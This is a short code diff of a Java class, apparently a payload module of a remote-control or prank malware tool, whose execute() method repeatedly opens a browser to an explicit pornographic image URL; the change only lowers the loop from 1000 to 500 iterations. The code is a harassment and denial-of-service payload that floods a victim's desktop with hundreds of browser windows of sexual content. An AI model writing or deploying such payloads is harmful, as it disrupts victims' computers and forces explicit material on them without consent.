@@ -15,7 +15,7 @@ import java.net.URI;
 public class FurryPorn implements PayloadExecutor {
     @Override
     public void execute() throws Exception {
-        for(int i = 0; i < 1000; i++) {
+        for(int i = 0; i < 500; i++) {
             try {
                 Desktop.getDesktop().browse(URI.create("https://static1.e621.net/data/sample/93/68/9368cca139a855bd2d1322fab98d84e8.jpg"));
             }
